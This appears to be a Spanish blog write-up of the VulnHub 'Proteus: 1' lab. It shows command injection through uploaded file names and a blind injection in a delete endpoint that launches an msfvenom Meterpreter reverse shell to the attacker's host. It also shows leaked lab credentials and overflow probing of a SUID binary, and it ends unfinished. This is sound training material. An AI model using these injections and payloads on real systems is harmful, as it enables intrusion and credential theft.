---
layout: post
title: Resolviendo Proteus: 1
---

# Introducción

En este *post* voy a detallar las pruebas realizadas sobre la máquina [*Proteus 1*](https://www.vulnhub.com/entry/proteus-1,193/). La descripción y objetivos que se indican son:

> An IT Company implemented a new malware analysis tool for their employees to scan potentially malicious files. This PoC could be a make or break for the company.

> It is your task to find the bacterium.

> Goal: Get root, and get flag... This VM was written in a manner that does not require `wget http://exploit; gcc exploit.`

> NB: VMWare might complain about the .ovf specification. If this does come accross your path, click the retry button and all should be well.

# Puesta en marcha

Importo la máquina virtual en Virtualbox. Al arrancar no reconoce la red (no puedo encontrar la máquina desde Kali). En la fase de arranque
en Grub elijo Recovery Mode y cuando sale el menú, marco Network y cuando diga OK, marco Resume. Ahora sí que se reconoce la red.

# Enumeración de Puertos

Comienzo haciendo una enumeración rápida de puertos:

```
$ nmap -sV -T4 -O -F 172.16.0.6
```

Resultado:

```
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 40:3e:c5:6f:dc:63:c5:af:43:51:28:5c:05:f5:98:c2 (RSA)
|   256 bb:9c:b0:3c:ff:48:8a:2b:37:d2:fe:2e:78:ce:8c:a9 (ECDSA)
|_  256 ff:85:4e:91:29:da:d1:1b:b3:11:26:5b:d8:c0:7a:f8 (EdDSA)
80/tcp open  http    Apache httpd
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: Apache
|_http-title: Proteus | v 1.0
MAC Address: 08:00:27:0E:25:3D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Uptime guess: 199.638 days (since Thu Dec 29 23:41:24 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

# Pruebas preliminares

Parece que sólo se encuentran abiertos los puertos 22 (SSH) y 80 (HTTP).

## Intento de acceso root por ssh

Trato de acceder con ssh:

```
root@kali:~# ssh root@172.16.0.6
   d8888b. d8888b.  .d88b.  d888888b d88888b db    db .d8888.
   88  `8D 88  `8D .8P  Y8. `~~88~~' 88'     88    88 88'  YP
   88oodD' 88oobY' 88    88    88    88ooooo 88    88 `8bo.  
   88~~~   88`8b   88    88    88    88~~~~~ 88    88   `Y8b.
   88      88 `88. `8b  d8'    88    88.     88b  d88 db   8D
   88      88   YD  `Y88P'     YP    Y88888P ~Y8888P' `8888Y'

"A bacterium found in the intestines of animals and in the soil."

                 Corporate Malware Validator.
Permission denied (publickey).
```

Paso cerrado. Es necesaria la clave ssh para poder acceder.

## Subir archivos a la web

A ver qué nos aparece en la web:

![Home de la Web]({{ site.url }}/assets/proteus_web_home.png "Home")

La aplicación indica que se permite subir archivos con formato mime application/x-executable y application/x-sharedlib. Además, nos aparece un cuadro de inicio de sesión (usuario y contraseña).

Vamos a probar a subir un archivo ejecutable. Para ello, creo un típico "Hello World!" en C, lo compilo y lo subo con el nombre *helloworld*.

![Subido Hello World]({{ site.url }}/assets/proteus_hello_world.png "Hello World")

Vemos que aparecen dos columnas, una con el resultado de ejecutar `strings` y otra con el resultado de ejecutar `objdump -d`.

Cosas interesantes:

* Aparece el nombre del archivo, con la ruta completa, en la carpeta `/home/malwareadm/samples` con el nombre del fichero cambiado por uno que parece aleatorio.

* Al comienzo de cada archivo aparece **File:** seguido del nombre asignado al fichero en codificación BASE64.

## Intento de acceso con usuario *malwareadm* por ssh

Bueno, parece que tenemos un nombre de usuario del sistema: *malwareadm*. Si intentamos acceder por ssh, vemos que de nuevo necesitamos el fichero clave para acceder:

```
root@kali:~# ssh malwareadm@172.16.0.6
   d8888b. d8888b.  .d88b.  d888888b d88888b db    db .d8888.
   88  `8D 88  `8D .8P  Y8. `~~88~~' 88'     88    88 88'  YP
   88oodD' 88oobY' 88    88    88    88ooooo 88    88 `8bo.  
   88~~~   88`8b   88    88    88    88~~~~~ 88    88   `Y8b.
   88      88 `88. `8b  d8'    88    88.     88b  d88 db   8D
   88      88   YD  `Y88P'     YP    Y88888P ~Y8888P' `8888Y'

"A bacterium found in the intestines of animals and in the soil."

                 Corporate Malware Validator.
Permission denied (publickey).
```

## Comprobar usuarios y contraseñas típicas

Antes de probar nada más elaborado, probaremos a mano las siguientes combinaciones de usuario/contraseña:

* root/sin contraseña
* root/root
* root/1234
* root/admin
* admin/sin contraseña
* admin/root
* admin/1234
* admin/admin
* malwareadm/sin contraseña
* malwareadm/malwareadm
* malwareadm/1234

Sin éxito en ninguna de ellas

## Tratar de sortear la validación de tipo de fichero

Arrancamos BurpSuite, activamos el proxy en el navegador y enviamos el siguiente archivo `prueba.php`:

```php
<?php
phpinfo() ;
?>
```

Cambiamos el *Content-type*:

![Cambio del Content-type]({{ site.url }}/assets/proteus_content_type.png "Cambio del Content Type")

Resultado:

![Invalid Mime-type]({{ site.url }}/assets/proteus_invalid_mimetype.png "Invalid Mime Type")

O sea, que la aplicación lleva a cabo su propia comprobación del tipo de fichero. ¿Se realizará por el contenido, por la extensión?

Vamos a renombrar el archivo *helloworld* anterior  a *helloworld.php* a ver si la aplicación se piensa que es PHP. Lo subimos y...

![Conserva la Extensión]({{ site.url }}/assets/proteus_extension.png "Conserva la extensión")

# Inyección de código en la extensión del archivo

El archivo ha sido aceptado por la aplicación y ¡ha mantenido la extensión! Utilizando BurpSuite, vamos a cambiar la extensión de nuestro archivo *helloworld* a *helloworld.elf&pwd&ls*

![Inyección en la Extensión 1]({{ site.url }}/assets/proteus_extension_injection1.png "Inyección en la extensión 1")

¡Bingo!

![Resultado de la inyección en la Extensión 1]({{ site.url }}/assets/proteus_extension_injection1_r.png "Resultado de la inyección en la extensión 1")

Estamos en la carpeta */home/malwareadm/sites/proteus_site/web/public/* y los archivos que hay son: *assets, index.php*

Vamos a ver el contenido de estos ficheros, utilizando como extensión *.elf **. El resultado es:

```
// Core requirement for this site.
require '../lib/bootstrap.php';
// The Index page
require '../routes/route.index.php';
// The Login page
require '../routes/route.samples.php';
// The Submit page
require '../routes/route.submit.php';
// The delete functionality
require '../routes/route.delete.php';
$app->run();
```

Parece que el código de interés está en la carpeta *routes* y que están implementadas las siguientes páginas:
* **index** con la página inicial que se muestra.
* **samples** con el listado de archivos subidos.
* **submit** para subir archivos.
* **delete** para borrar archivos. Esta opción no nos ha aparecido por ahora.

## Pero no tan rápido

Tratemos de ver qué hay en la carpeta anterior. Para ello, pruebo con las siguientes extensiones:

```
1. .elf&ls ..
2. .elf&ls /home/malwareadm/sites/proteus_site/web
3. .elf ../*
```

Sin éxito todas ellas. Trato también de crear un archivo usando como extensión

```
.elf&echo hola>hola.php
```

Sin éxito tampoco.

Tras varias pruebas... bueno, más que varias, un montón, obtengo información que me puede ser útil.

Contenido de la carpeta anterior, `/home/malwareadm/sites/proteus_site/web`

```
Usamos como extensión .elf&ls -al $(dirname `pwd`)

total 52
drwxr-xr-x 9 malwareadm malwareadm 4096 May 10 08:30 .
drwxr-xr-x 4 malwareadm malwareadm 4096 May 15 14:43 ..
drwxr-xr-x 2 malwareadm malwareadm 4096 May 2 14:08 cfg
-rwxr-xr-x 1 malwareadm malwareadm 745 May 2 16:38 composer.json
-rw-r--r-- 1 malwareadm malwareadm 11175 May 2 16:38 composer.lock
drwxr-xr-x 3 malwareadm malwareadm 4096 May 2 14:04 lib
drwxrwxrwx 2 malwareadm malwareadm 4096 May 10 08:10 logs
drwxr-xr-x 3 malwareadm malwareadm 4096 May 2 14:04 public
drwxr-xr-x 2 malwareadm malwareadm 4096 May 4 19:26 routes
drwxr-xr-x 5 malwareadm malwareadm 4096 May 4 20:37 templates
drwxr-xr-x 8 malwareadm malwareadm 4096 May 2 16:38 vendor
```

Contenido íntegro de la carpeta  `/home/malwareadm/sites/proteus_site/` incluyendo subcarpetas

```
Usamos como extensión .elf&find $(dirname $(dirname `pwd`))

...
/home/malwareadm/sites/proteus_site
/home/malwareadm/sites/proteus_site/admin_login_request.js
/home/malwareadm/sites/proteus_site/PROTEUS_INSTALL
/home/malwareadm/sites/proteus_site/db
/home/malwareadm/sites/proteus_site/admin_login_logger
...
```

Como vemos que hay varios archivos que incluyen la palabra *admin*, vamos a buscar todos:

```
Usamos como extensión .elf&find $(dirname $(dirname `pwd`)) -name *admin*

/home/malwareadm/sites/proteus_site/admin_login_request.js
/home/malwareadm/sites/proteus_site/admin_login_logger
/home/malwareadm/sites/proteus_site/web/templates/admin
```

Mostramos el contenido de dichos archivos:

```
Usamos como extensión .elf&for d in $(find $(dirname $(dirname `pwd`)) -maxdepth 2 -name *admin*); do strings $d; done

// THIS IS JUST USED TO IMPERSONATE AN ADMIN FOR THE CHALLENGE
var username = 'malwareadm';
var pwd = 'q-L%40X%21%7Bl_%278%7C%29o%3FQ%2BTapahQ%3C_';
var webPage = require('webpage');
var page = webPage.create();
var postBody = 'username=' + username + '&password=' + pwd;
page.open('http://127.0.0.1/samples', 'post', postBody, function (status) {
  if (status !== 'success') {
    console.log('Unable to post!');
  } else {
    console.log(JSON.stringify({
      cookies: phantom.cookies
  }));
...
```

# Contraseña de *malwareadm*

No sé si esta es la forma que el creador de la máquina virtual ha previsto para encontrar la clave... pero bueno, aquí la hemos obtenido en codificación BASE64. Si la ponemos en claro, tenemos:

+ **Usuario**: *malwareadm*
+ **Contraseña**: *q-L@X!{l_'8|)o?Q+TapahQ<_*

![malwareadm logged in]({{ site.url }}/assets/proteus_malwareadm_loggedin.png "malwareadm logged in")

Y comprobamos que la página *samples* ahora nos muestra una nueva opción **DELETE** que nos permite borrar archivos previamente subidos.

Este borrado se realiza mediante un link en el que se indica el fichero a borrar utilizando la codificación BASE64 del nombre de archivo:

![Enlace para borrar archivo]({{ site.url }}/assets/proteus_delete_sample_code.png "Enlace para borrar archivo")

Si borramos alguno de los archivos:

![Archivo borrado]({{ site.url }}/assets/proteus_sample_deleted.png "Archivo borrado")

Recordemos que habíamos encontrado que existe el archivo *route.delete.php*. Como el parámetro que se utiliza para borrar un archivo es el nombre de dicho archivo en codificación BASE64, podemos pensar que es posible realizar algún tipo de inyección de código. En lugar de hacer pruebas a ciegas, vamos a ver el contenido de dicho archivo para comprobar si es posible.

Para obtener el código de dicha página, subimos un archivo y modificamos la extensión:

```
Usamos como extensión .elf&find $(dirname $(dirname `pwd`)) -name *delete*

/home/malwareadm/sites/proteus_site/web/templates/delete.twig.html
/home/malwareadm/sites/proteus_site/web/routes/route.delete.php
```

Vemos que hay dos ficheros... mostramos el contenido de ambos.

```
Usamos como extensión .elf&for d in $(find $(dirname $(dirname `pwd`)) -name *delete*); do strings $d; done

...
<?php
  $app->get('/delete/:filename/?',
          $work = function ($filename) use ($app) {
              if (isset($_SESSION['name'])) {
                $message = "Logged in as: " . $_SESSION['name'];
                if (isset($_SESSION['admin'])) {
                  $admin = 1;
                } else {
                  $admin = 0;
                }
              } else {
                $app->redirect(conf::INSTALLED_DIRECTORY);
              }
              //get all submitted files
              foreach(array_diff(scandir(Conf::FILE_PATH), array('.', '..')) as $file) {
                if (strpos(base64_decode($filename), $file) !== false) {
                  shell_exec('rm '. Conf::FILE_PATH . base64_decode($filename));
                  $message = "Successfully deleted " . Conf::FILE_PATH . base64_decode($filename);
                }
              }
              $app->render('delete.twig.html', array('adminMessage' => $message  ));
            }
```

Pues la única comprobación que se realiza es que la decodificación BASE64 del parámetro pasado incluya el nombre del archivo existente. Si es así, se ejecuta el comando `rm` concatenando el *PATH* y el resultado de decodificar el nombre del archivo. **Inyección garantizada :)** . Sin embargo, no se muestra el resultado de la ejecución, así que la inyección se hace *a ciegas*.

# Meterpreter

Utilizando *msvenom* vamos a crear un ejecutable con *Meterpreter*. Lo subiremos a la página y trataremos de ejecutarlo.

```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.16.0.4 LPORT=10000 -f elf > meterpreter_reverse_tcp_172_16_0_4_10000.elf
```

Subimos también un *helloworld*, para poder borrarlo e inyectar el código que ejecute nuestro *meterpreter*.

El nombre del archivo asignado a *helloworld* es **59784639ec223.**
El nombre del archivo asignado a *meterpreter* es **59784659d583f.elf**

El comando completo que quiero que se ejecute es:

```
$ rm /home/malwareadm/samples/59784639ec223. & /home/malwareadm/samples/59784659d583f.elf
                              -----------------------------------------------------------
```

Si la inyección funciona, debería obtener una sesión en *meterpreter*. Inicio *metasploit* y hago uso del módulo *exploit/multi/handler* con *LHOST=172.16.0.4* y *LPORT=10000*.

![Metasploit multi handler]({{ site.url }}/assets/proteus_metasploit_handler.png "Metasploit multi handler")

Codificamos en BASE64 lo subrayado:

```
TEXTO:  59784639ec223. & /home/malwareadm/samples/59784659d583f.elf
BASE64: NTk3ODQ2MzllYzIyMy4gJiAvaG9tZS9tYWx3YXJlYWRtL3NhbXBsZXMvNTk3ODQ2NTlkNTgzZi5lbGYK
```

Iniciamos sesión con *malwareadm* y visitamos el enlace: `http://172.16.0.6/delete/NTk3ODQ2MzllYzIyMy4gJiAvaG9tZS9tYWx3YXJlYWRtL3NhbXBsZXMvNTk3ODQ2NTlkNTgzZi5lbGYK`

Y el resultado es...

![Sesión de Meterpreter]({{ site.url }}/assets/proteus_meterpreter_session.png "Sesión de Meterpreter")

# Clave SSH

Encontramos el siguiente archivo: */home/malwareadm/sites/proteus_site/PROTEUS_INSTALL*. Si miramos el contenido, aparece, entre otras, una clave para acceder vía SSH:

```
THIS SOFTWARE COMES WITH A PRE INSTALLED USER CALLED "malwareadm"

THE SOFTWARE CAN BE SET UP REMOTELY VIA SSH OR ANY OTHER MEANS.

THE KEY GENERATED FOR THIS USER IS:
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6F2AF2450CD5C1D72E159F0B78548D69

WvWSLDEbMl+JVsCyHD5LSJIT+ARfsPvRpIX/IxunQxPgMUkJl3ZDD45DH1ap36dk
...
```

Trataremos de acceder por SSH utilizando dicha clave. Creamos un archivo llamado *malwareadm_key.txt* y copiamos la clave SSH. Cambiamos el permiso de dicho archivo `chmod 600 malwareadm_key.txt`

Accedemos: `ssh -i malwareadm_key.txt malwareadm@172.16.0.6`

```
root@kali:~# ssh -i malwareadm_key.txt malwareadm@172.16.0.6
   d8888b. d8888b.  .d88b.  d888888b d88888b db    db .d8888.
   88  `8D 88  `8D .8P  Y8. `~~88~~' 88'     88    88 88'  YP
   88oodD' 88oobY' 88    88    88    88ooooo 88    88 `8bo.  
   88~~~   88`8b   88    88    88    88~~~~~ 88    88   `Y8b.
   88      88 `88. `8b  d8'    88    88.     88b  d88 db   8D
   88      88   YD  `Y88P'     YP    Y88888P ~Y8888P' `8888Y'

"A bacterium found in the intestines of animals and in the soil."

                 Corporate Malware Validator.
Enter passphrase for key 'malwareadm_key.txt':
```

Y comprobamos que la clave está protegida por contraseña.

# MySQL

Encontramos el siguiente archivo: */home/malwareadm/sites/proteus_site/web/cfg/config.php*

```php
<?php

class Conf
{

    /* MySQL */
    const MYSQL_USERNAME    =   'root';
    const MYSQL_PASSWORD    =   'viWJ.cgdf&3a]d3xh;C/c]&c?';
    const MYSQL_HOST        =   '127.0.0.1';
    const MYSQL_DATABASE    =   'proteus_db';

    /* Application */
    const DEBUG                 =   false; 	                    //true/false
    const INSTALLED_DIRECTORY   =   '/';                        //something
    const MAIL_ALIAS		    =	'malwareadm@proteus.local';	//Something like user@internet.co.za
    const SECRET                =   'thisisthesecret';          //This is the secret to salt the hashes
    const FILE_PATH             =   '/home/malwareadm/samples/'; //This is the file path of where the execs will be saved
}
```

Iniciamos sesión en *MySQL* y miramos la información que hay:

![Usuarios de la Aplicación en MySQL]({{ site.url }}/assets/proteus_mysql_app_users.png "Usuarios en MySQL")

El único usuario que existe es *malwareadm* y el campo **password** tiene como contenido *dba10459f1a4c8b25507aee1ab823a26de92fb44*. La longitud de 40 caracteres da que pensar que se trata de un HASH SHA-1. Seguramente se encuentra *salted* con el *SECRET* indicado en el archivo anterior.

Para saber exactamente cómo es, hago una búsqueda en */home/malwareadm/sites/proteus/site/web* en la que aparezca SHA1:

```
$ grep -r -n -i "sha1" .

...
./lib/bootstrap.php:82:    return sha1(md5(Conf::SECRET . $var));
```

Sin embargo, creo que esta parte del código que sirve para verificar el usuario no se utiliza... Si pruebo la contraseña obtenida de *malwareadm* y el *SECRET* para obtener el HASH combinado de SHA1 con MD5, el resultado no coincide:


```bash
$ set +H
$ echo -n "thisisthesecretq-L@X!{l_'8|)o?Q+TapahQ<_" | md5sum | sha1sum
7683b6cf01db7c771459d42f2e454b3195b72ddb  -
```

De hecho, si creo un nuevo usuario llamado *hola* con contraseña *hola*

```
$ echo -n thisisthesecrethola|md5sum|sha1sum
dd343a63295187ef43b7c91e86c00c16e2daf3aa  -

python -c 'import pty;pty.spawn("/bin/bash")'
www-data@Proteus:/home/malwareadm/sites/proteus_site$ mysql -u root -p
Enter password: viWJ.cgdf&3a]d3xh;C/c]&c?

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 184
Server version: 5.7.18-0ubuntu0.16.10.1 (Ubuntu)

Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> insert into proteus_db.tbl_user values( 2, 'hola', 'dd343a63295187ef43b7c91e86c00c16e2daf3aa', 1) ;


mysql> select * from proteus_db.tbl_user ;
+----+------------+------------------------------------------+-------+
| id | name       | password                                 | admin |
+----+------------+------------------------------------------+-------+
|  1 | malwareadm | dba10459f1a4c8b25507aee1ab823a26de92fb44 |     1 |
|  2 | hola       | dd343a63295187ef43b7c91e86c00c16e2daf3aa |     1 |
+----+------------+------------------------------------------+-------+
2 rows in set (0.00 sec)
```

Con este nuevo usuario, no se puede iniciar la sesión en la aplicación.

# SUID

Parece que los caminos anteriores no llegan a ninguna parte.

Entre los archivos que hay en */home/malwareadm* y subcarpetas, llama la atención el archivo */home/malwareadm/sites/proteus_site/admin_login_logger*. El propietario es **root** y tiene activo el bit SUID. Vamos a ver si hallamos alguna vulnerabilidad de tipo *SUID*.

Si lo ejecutamos, hace lo siguiente:

```
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ls -al
ls -al
total 36
drwxr-xr-x 4 malwareadm malwareadm 4096 May 15 14:43 .
drwxr-xr-x 3 malwareadm malwareadm 4096 May  2 14:43 ..
-rw-r--r-- 1 malwareadm malwareadm 6115 May  4 22:18 PROTEUS_INSTALL
-rwsr-xr-x 1 root       root       7824 May 10 09:18 admin_login_logger
-rw-r--r-- 1 malwareadm malwareadm  515 May 15 14:43 admin_login_request.js
drwxr-xr-x 2 malwareadm malwareadm 4096 May  2 14:07 db
drwxr-xr-x 9 malwareadm malwareadm 4096 May 10 08:30 web

www-data@Proteus:/home/malwareadm/sites/proteus_site$ ./admin_login_logger
Usage: ./admin_login_logger  ADMIN LOGIN ATTEMPT (This will be done with phantomjs)
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ./admin_login_logger hola
Writing datafile 0x9ba81d0: '/var/log/proteus/log'
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ls -al /var/log/proteus
total 120
drwxr-xr-x  2 root root         4096 May 10 05:02 .
drwxrwxr-x 10 root syslog       4096 May 10 07:28 ..
-rw-------  1 root malwareadm 107315 Jul 26 17:21 log

```

Como vemos, el programa escribe algo en un archivo al que no podemos acceder. Vamos a comprobar si podemos utilizar argumentos muy largos para forzar algo:

```
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ./admin_login_logger $(for i in {0..99}; do echo -n X; done)
Writing datafile 0x91f71d0: '/var/log/proteus/log'
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ./admin_login_logger $(for i in {0..399}; do echo -n X; done)
Writing datafile 0x8f7e1d0: '/var/log/proteus/log'
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ./admin_login_logger $(for i in {0..799}; do echo -n X; done)
Writing datafile 0x96781d0: 'XXXXXXXXXXXXXXXXXXXXXXXXXXXX	'
*** Error in `./admin_login_logger': double free or corruption (!prev): 0x09678008 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x67f0a)[0xb75fff0a]
/lib/i386-linux-gnu/libc.so.6(+0x6eb07)[0xb7606b07]
/lib/i386-linux-gnu/libc.so.6(+0x6f3c6)[0xb76073c6]
./admin_login_logger[0x8048a14]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf6)[0xb75b0276]
./admin_login_logger[0x80485d1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:01 659612     /home/malwareadm/sites/proteus_site/admin_login_logger
08049000-0804a000 r--p 00000000 08:01 659612     /home/malwareadm/sites/proteus_site/admin_login_logger
0804a000-0804b000 rw-p 00001000 08:01 659612     /home/malwareadm/sites/proteus_site/admin_login_logger
09678000-09699000 rw-p 00000000 00:00 0          [heap]
b7400000-b7421000 rw-p 00000000 00:00 0
b7421000-b7500000 ---p 00000000 00:00 0
b757a000-b7596000 r-xp 00000000 08:01 131129     /lib/i386-linux-gnu/libgcc_s.so.1
b7596000-b7597000 r--p 0001b000 08:01 131129     /lib/i386-linux-gnu/libgcc_s.so.1
b7597000-b7598000 rw-p 0001c000 08:01 131129     /lib/i386-linux-gnu/libgcc_s.so.1
b7598000-b774b000 r-xp 00000000 08:01 132762     /lib/i386-linux-gnu/libc-2.24.so
b774b000-b774c000 ---p 001b3000 08:01 132762     /lib/i386-linux-gnu/libc-2.24.so
b774c000-b774e000 r--p 001b3000 08:01 132762     /lib/i386-linux-gnu/libc-2.24.so
b774e000-b774f000 rw-p 001b5000 08:01 132762     /lib/i386-linux-gnu/libc-2.24.so
b774f000-b7752000 rw-p 00000000 00:00 0
b775b000-b775e000 rw-p 00000000 00:00 0
b775e000-b7760000 r--p 00000000 00:00 0          [vvar]
b7760000-b7762000 r-xp 00000000 00:00 0          [vdso]
b7762000-b7784000 r-xp 00000000 08:01 131842     /lib/i386-linux-gnu/ld-2.24.so
b7784000-b7785000 rw-p 00000000 00:00 0
b7785000-b7786000 r--p 00022000 08:01 131842     /lib/i386-linux-gnu/ld-2.24.so
b7786000-b7787000 rw-p 00023000 08:01 131842     /lib/i386-linux-gnu/ld-2.24.so
bffdb000-bfffc000 rw-p 00000000 00:00 0          [stack]
Aborted (core dumped)
```

Parece que algo hemos roto. Además, nos aparece un nuevo archivo propiedad de *root*. No podemos ver el contenido, sólo el tamaño (492 bytes).

```
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ls -al
ls -al
total 40
drwxr-xr-x 4 malwareadm malwareadm 4096 Jul 26 17:29 .
drwxr-xr-x 3 malwareadm malwareadm 4096 May  2 14:43 ..
-rw-r--r-- 1 malwareadm malwareadm 6115 May  4 22:18 PROTEUS_INSTALL
-rw------- 1 root       www-data    492 Jul 26 17:29 XXXXXXXXXXXXXXXXXXXXXXXXXXXX??
-rwsr-xr-x 1 root       root       7824 May 10 09:18 admin_login_logger
-rw-r--r-- 1 malwareadm malwareadm  515 May 15 14:43 admin_login_request.js
drwxr-xr-x 2 malwareadm malwareadm 4096 May  2 14:07 db
drwxr-xr-x 9 malwareadm malwareadm 4096 May 10 08:30 web
```

Hacemos unas pruebas para hallar la longitud del argumento a partir de la que empieza a fallar, resultando 451:

```
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ./admin_login_logger $(for i in {0..450}; do echo -n G; done)
Writing datafile 0x94b11d0: '/var/log/proteus/log'
www-data@Proteus:/home/malwareadm/sites/proteus_site$ ./admin_login_logger $(for i in {0..451}; do echo -n H; done)
Writing datafile 0x827c1d0: '/var/log/proteus/log'
*** Error in `./admin_login_logger': double free or corruption (!prev): 0x0827c008 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x67f0a)[0xb75fdf0a]
```

Como no podemos leer los archivos creados por el desbordamiento de buffer, vamos a ver si podemos descargar *admin_login_logger* y ejecutarlo en local.



Contenido de /home/malwareadm/ .elf&ls -al $(dirname $(dirname $(dirname $(dirname `pwd`))))


Probamos:

SqlMap: sin resultados. Probados:

```
sqlmap -u "http://172.16.0.6/samples" --data="username=1&password=2"

sqlmap -u "http://172.16.0.6/samples" --data="username=1&password=2" --dbms=MySQL --random-agent --level=5 --risk=3
```

7F454C46020101
